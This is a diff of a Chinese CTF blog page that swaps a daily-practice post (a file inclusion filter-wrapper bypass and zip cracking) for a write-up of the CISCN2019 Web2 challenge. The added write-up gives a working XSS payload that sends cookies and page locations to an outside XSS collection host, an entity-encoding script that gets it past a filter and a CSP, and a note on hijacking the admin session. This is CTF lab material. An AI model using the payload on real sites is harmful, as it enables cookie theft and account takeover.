@@ -6,7 +6,7 @@
 <meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
 <meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
 <meta HTTP-EQUIV="expires" CONTENT="0"> 
-<title>2020/3/9日常刷题~~~~~ | 过客</title>	
+<title>[CISCN2019 华东北赛区]Web2(XSS绕过及CSP) | 过客</title>	
 
 <link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
 <script type="text/javascript">
@@ -150,10 +150,10 @@ window.onload=getCSS();
 	
 	                      
 		<div class="entry-content">
-			<h1 class="wow swing entry-title">2020/3/9日常刷题~~~~~</h1>
+			<h1 class="wow swing entry-title">[CISCN2019 华东北赛区]Web2(XSS绕过及CSP)</h1>
 <div class="entry-meta">
 <div class="wow bounce">
-	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-09 15:19:22" itemprop="datePublished" pubdate="">2020-03-09</time></i>
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-09 20:30:00" itemprop="datePublished" pubdate="">2020-03-09</time></i>
 	          </div>
 			
 </span>
@@ -161,65 +161,47 @@ window.onload=getCSS();
 		</div>
                   
 			<div class="wow slideInLeft entry-summary song">
-				<p><strong>[ACTF新生赛2020]base64隐写</strong><br>
-base64隐写。脚本一把梭</p>
+				<p>注册登陆就不说了。还有两个功能。一个是发表文章。还有一个是输入URL。管理员会访问<br>
+<img src="https://guokeya.github.io/post-images/1583757436436.png" alt="" loading="lazy"><br>
+在我们发布文章的地址。有CSP</p>
 <!-- more -->
-<p><strong>[BSidesCF 2020]Had a bad day</strong><br>
-文件包含得到源码<br>
-<img src="https://guokeya.github.io/post-images/1583740041620.png" alt="" loading="lazy"></p>
-<pre><code>&lt;?php
-$file = $_GET['category'];
-if(isset($file)){
-       if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;)){
-			include ($file . '.php');
-}else{
-		echo &quot;Sorry, we currently only support woofers and meowers.&quot;;
-}
+<pre><code>&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'&quot;&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
 </code></pre>
-<p>提交的值中。必须包含index/woofers/meowers之一<br>
-php版本为7.不能用00绕过。这里有个新姿势<br>
-php://filter/read=convert.base64-encode/index/resource=flag.php<br>
-即可绕过</p>
-<p><strong>[BSidesSF2019]zippy</strong><br>
-发现一个压缩包<br>
-<img src="https://guokeya.github.io/post-images/1583741933405.png" alt="" loading="lazy"><br>
-继续搜数据流<br>
-<img src="https://guokeya.github.io/post-images/1583741985647.png" alt="" loading="lazy"><br>
-保存解压得到flag</p>
-<p><strong>key不在这里</strong><br>
-二维码得到<code>https://cn.bing.com/search?q=key%E4%B8%8D%E5%9C%A8%E8%BF%99%E9%87%8C&amp;m=10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568&amp;qs=n&amp;form=QBRE&amp;sp=-1&amp;sc=0-38&amp;sk=&amp;cvid=2CE15329C18147CBA4C1CA97C8E1BB8C</code><br>
-将10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568。ascii转字符得到flag</p>
-<p><strong>[GUET-CTF2019]zips</strong><br>
-爆破得到密码723456。得到111.zip<br>
-伪加密。得到flag.zip和setup.sh</p>
-<pre><code>#!/bin/bash
-#
-zip -e --password=`python -c &quot;print(__import__('time').time())&quot;` flag.zip flag
+<p>可以使用URL跳转来绕过。随便输入一段XSS代码。发现过滤了等于号<br>
+用HTML_Mark编码<br>
+先构造payload吧。</p>
+<pre><code>(function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=3BcQlW&amp;location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&amp;toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&amp;cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&amp;opener='+escape((function(){try{return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
 </code></pre>
-<p>可以看到。他使用python时间戳来作为密码<br>
-格式是<br>
-15????????.??<br>
-以此掩码爆破。得到1558080832.15<br>
-得到flag</p>
-<p><strong>hashcat</strong><br>
-得到一个文件。右键看到有office字样。改doc打开。需要密码。爆破得到9919<br>
-并不是word类型。xls。pptx一个个试<br>
-在第7页看到一个有红色波浪线的东西。。选中改字体为红色。得到flag</p>
+<p>和XSS平台的有些不一样。这里用window.localtion.href代替new image。自动刷新就会执行js代码<br>
+最后HTML_Mark编码下<br>
+用了下赵师傅的脚本</p>
+<pre><code>s=&quot;(function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=3BcQlW&amp;location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&amp;toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&amp;cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&amp;opener='+escape((function(){try{return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();&quot;
+output=&quot;&quot;
+for c in s:
+    output+=&quot;&amp;#&quot;+str(ord(c))
+print &quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot;+output+&quot;&amp;#34&amp;#41&lt;/script&gt;&quot;
+</code></pre>
+<p>在URL处。填写刚刚发布的webURL。<br>
+<img src="https://guokeya.github.io/post-images/1583758832786.png" alt="" loading="lazy"><br>
+这个URL。不能出现-。短链接。URL编码都没能绕过。<br>
+未解之谜。我的URL是<code>http://a4bc6180-66d3-4d36-9f3f-9c09b91ca13f.node3.buuoj.cn/commitbug.php</code>却用<code>http://web.node1.buuoj.cn/post/462db5fb906b1b3ee96fc06d4fc2156a.html</code>收到了请求？<br>
+<img src="https://guokeya.github.io/post-images/1583758977352.png" alt="" loading="lazy"><br>
+替换phpsessid后。进入admin.php。sql回显注入。</p>
 
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
  
-				<a href="https://guokeya.github.io/tag/z6LGuzLFL/" rel="tag">杂项</a>	
+				<a href="https://guokeya.github.io/tag/CTF/" rel="tag">CTF</a>	
+				 
+				<a href="https://guokeya.github.io/tag/Web/" rel="tag">Web安全</a>	
 				 
 					</div>						
 <nav class="navigation3 post-navigation3" role="navigation">
 		
 		<div class="nav-links3">
       
-		<div class="wow bounceInLeft nav-previous3"><a href="https://guokeya.github.io/post/LaUpgZVXn/" rel="prev"> [CISCN2019 华东北赛区]Web2(XSS绕过及CSP)</a></div>
 		 
-		 
-		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/VmI2NBAXh/" rel="next"> [强网杯 2019]Upload(thinkphp代码审计序列化)</a></div>
+		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/H7-qyM-1l/" rel="next"> 2020/3/9日常刷题~~~~~</a></div>
 		
 		</div>
 	</nav>
